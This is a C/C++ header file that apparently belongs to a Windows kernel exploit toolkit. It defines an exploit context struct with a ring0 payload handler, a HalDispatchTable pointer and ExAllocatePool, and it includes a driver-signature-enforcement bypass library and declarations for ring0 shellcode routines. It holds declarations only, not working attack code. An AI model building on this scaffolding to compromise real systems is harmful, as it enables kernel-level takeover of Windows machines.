#pragma once

#include <Windows.h>
#include "ntdll_defs.h"
#include "ntdll_undocnt.h"
#include "common_expl.h"
#include "libdsebypass.h"

typedef struct _KERNEL_EXPL_CONTEXT
{
	// information about successful execution of _r0_proc_continue()
	BOOL bExplOk;

	// information caller specified ring0 payload
	KERNEL_EXPL_HANDLER Handler;
	PVOID HandlerContext;

	// information about kernel environment
	PHAL_DISPATCH HalDispatchTable;
	func_ExAllocatePool f_ExAllocatePool;

} KERNEL_EXPL_CONTEXT,
*PKERNEL_EXPL_CONTEXT;

extern "C"
{
	void WINAPI GetCPUIDFeatureBits(DWORD EaxValue, PDWORD EcxValue, PDWORD EdxValue, PDWORD EbxValue);

	// functions used in ring0 shellcode
	void WINAPI _r0_proc_begin(PKERNEL_EXPL_CONTEXT pContext, PVOID ShellcodeAddr);
	void WINAPI _r0_proc_end(void);
	void WINAPI _r0_proc_continue(void);
}